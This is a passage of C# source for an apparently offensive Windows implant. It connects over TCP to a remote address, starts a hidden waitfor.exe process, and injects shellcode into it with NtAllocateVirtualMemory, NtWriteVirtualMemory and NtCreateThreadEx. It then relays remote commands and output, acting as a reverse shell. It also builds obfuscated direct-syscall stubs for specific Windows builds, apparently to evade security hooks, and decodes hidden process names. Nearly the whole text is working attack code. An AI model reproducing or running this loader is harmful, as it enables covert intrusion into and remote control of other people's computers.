                  tcpClient.Connect(IP, port);
                  stream = tcpClient.GetStream();
                  streamReader = new StreamReader(stream, System.Text.Encoding.Default);
                  streamWriter = new StreamWriter(stream, System.Text.Encoding.Default);
              }
              catch (Exception)
              {
                  return;
              }

              Process ShellProcess;
              ShellProcess = new Process();
              ShellProcess.StartInfo.FileName = "C:\\Windows\\System32\\waitfor.exe";
              ShellProcess.StartInfo.Arguments = "/T 99999 signal";
              ShellProcess.StartInfo.CreateNoWindow = true;
              ShellProcess.StartInfo.UseShellExecute = false;
              ShellProcess.StartInfo.RedirectStandardInput = true;
              ShellProcess.StartInfo.RedirectStandardOutput = true;
              ShellProcess.StartInfo.RedirectStandardError = true;
              ShellProcess.OutputDataReceived += new DataReceivedEventHandler(SortOutputHandler);
              ShellProcess.ErrorDataReceived += new DataReceivedEventHandler(SortOutputHandler);
              ShellProcess.Start();
              System.Threading.Thread.Sleep(1000);
              string procName = "waitfor";

              int ProcId = FindUserPID( procName );
              CLIENT_ID clientid = new CLIENT_ID();
              clientid.UniqueProcess = new IntPtr(ProcId);
              clientid.UniqueThread = IntPtr.Zero;
              IntPtr byteWritten = IntPtr.Zero;
              IntPtr procHandle = IntPtr.Zero;
              NtOpenProcess(ref procHandle, ProcessAccessFlags.All, new OBJECT_ATTRIBUTES(), ref clientid);
              IntPtr allocMemAddress = new IntPtr();
              UIntPtr scodeSize = (UIntPtr)(UInt32)scode.Length;
              NtAllocateVirtualMemory(procHandle, ref allocMemAddress, new IntPtr(0), ref scodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
              IntPtr unmanagedPointer = Marshal.AllocHGlobal(scode.Length);
              Marshal.Copy(scode, 0, unmanagedPointer, scode.Length);
              NtWriteVirtualMemory(procHandle, ref allocMemAddress, unmanagedPointer, (UInt32)(scode.Length), ref byteWritten);
              Marshal.FreeHGlobal(unmanagedPointer);
              IntPtr hRemoteThread;
              NtCreateThreadEx(out hRemoteThread, GENERIC_ALL, IntPtr.Zero, procHandle, allocMemAddress, IntPtr.Zero, 0, 0, 0, 0, IntPtr.Zero);
              CloseHandle(hRemoteThread);
              CloseHandle(procHandle);


            ShellProcess.BeginOutputReadLine();
            ShellProcess.BeginErrorReadLine();

            while (true)
            {
                try
                {
                    UserInput.Append(streamReader.ReadLine());
                    ShellProcess.StandardInput.WriteLine(UserInput);
                    UserInput.Remove(0, UserInput.Length);
                }
                catch (Exception)
                {
                    streamReader.Close();
                    streamWriter.Close();
                    ShellProcess.Kill();
                    break;
                }
            }

        }


        }


        public static byte [] GetOSVersionAndReturnSyscall(byte sysType )
        {
            var syscall = new byte [] { 074, 138, 203, 185, 000, 001, 001, 001, 016, 006, 196 };
            var osVersionInfo = new OSVERSIONINFOEXW { dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEXW)) };
            NTSTATUS OSdata = RtlGetVersion(ref osVersionInfo);
            // Client OS
            if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 18362 || osVersionInfo.dwBuildNumber == 18363)) // 1903 1909
            {
                // ZwOpenProcess
                if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                // NtCreateThreadEx
                if (sysType == 2) { syscall[4] = 190; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                // ZwWriteVirtualMemory
                if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                // NtAllocateVirtualMemory
                if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                // NtCreateSection
                if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                // NtMapViewOfSection
                if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                // ZwCreateProcess
                if (sysType == 7) { syscall[4] = 182; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
                } else
                  if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17134)) // 1803
                  {
                      // ZwOpenProcess
                      if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // NtCreateThreadEx
                      if (sysType == 2) { syscall[4] = 188; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwWriteVirtualMemory
                      if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // NtAllocateVirtualMemory
                      if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // NtCreateSection
                      if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // NtMapViewOfSection
                      if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwCreateProcess
                      if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
                  } else
                  if ((osVersionInfo.dwPlatformId == 2) & (osVersionInfo.dwBuildNumber == 17763)) // 1809
                  {
                      // ZwOpenProcess
                      if (sysType == 1) { syscall[4] = 039; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // NtCreateThreadEx
                      if (sysType == 2) { syscall[4] = 189; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwWriteVirtualMemory
                      if (sysType == 3) { syscall[4] = 059; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // NtAllocateVirtualMemory
                      if (sysType == 4) { syscall[4] = 025; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // NtCreateSection
                      if (sysType == 5) { syscall[4] = 075; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // NtMapViewOfSection
                      if (sysType == 6) { syscall[4] = 041; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }} else
                      // ZwCreateProcess
                      if (sysType == 7) { syscall[4] = 181; for (byte i = 0; i <= 10; i++) { syscall[ i ]--; }}
                  }
                  return syscall;
          }


        private static string GetProcessUser(Process process)
        {
            IntPtr processHandle = IntPtr.Zero;
            try
            {
                OpenProcessToken(process.Handle, 8, out processHandle);
                WindowsIdentity wi = new WindowsIdentity(processHandle);
                string user = wi.Name;
                return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
            }
            catch
            {
                return null;
            }
            finally
            {
                if (processHandle != IntPtr.Zero)
                {
                    CloseHandle(processHandle);
                }
            }
        }


        public static int FindUserPID(string procName)
        {
            string owner;
            Process proc;
            int foundPID = 0;
            Process[] processList = Process.GetProcesses();
            foreach (Process process in processList)
            {
                if (process.ProcessName == procName) {
                    proc = Process.GetProcessById(process.Id);
                    owner = GetProcessUser(proc);
                    if (owner == Environment.UserName ) {
                        foundPID = process.Id;
                        break;
                    }
            }
        }
        return foundPID;
      }


      public static string ResolvProcessName(string c)
      {
          string result = "";
          int num = 0;
          int index = 0;
          string tmp = "";
          for (int i = 1; i <= c.Length; i++) {
              tmp = c.Substring(index, 1);
                  if (tmp == " ") { num++; index++; }
                  else if (tmp == "?") {
                  if (num == 1) { result = result + "a"; num = 0; }
                  else
                  if (num == 4) { result = result + "d"; num = 0; }
                  else
                  if (num == 14) { result = result + "n"; num = 0; }
                  else
                  if (num == 5) { result = result + "e"; num = 0; }
                  else
                  if (num == 16) { result = result + "p"; num = 0; }
                  else
                  if (num == 19) { result = result + "s"; num = 0; }
                  else
                  if (num == 22) { result = result + "v"; num = 0; }
                  else
                  if (num == 3) { result = result + "c"; num = 0; }
                  else
                  if (num == 8) { result = result + "h"; num = 0; }
                  else
                  if (num == 15) { result = result + "o"; num = 0; }
                  else
                  if (num == 20) { result = result + "t"; num = 0; }
                  index++;
              }
          }
          return result;
      }

      public static void SortOutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
      {
          StringBuilder strOutput = new StringBuilder();

          if (!String.IsNullOrEmpty(outLine.Data))
          {
              try
              {
                  strOutput.Append(outLine.Data);
                  streamWriter.WriteLine(strOutput);
                  streamWriter.Flush();
              }
              catch (Exception) { }
          }
      }


        public static unsafe void exec()
      	{
            Program();
        }

}

```
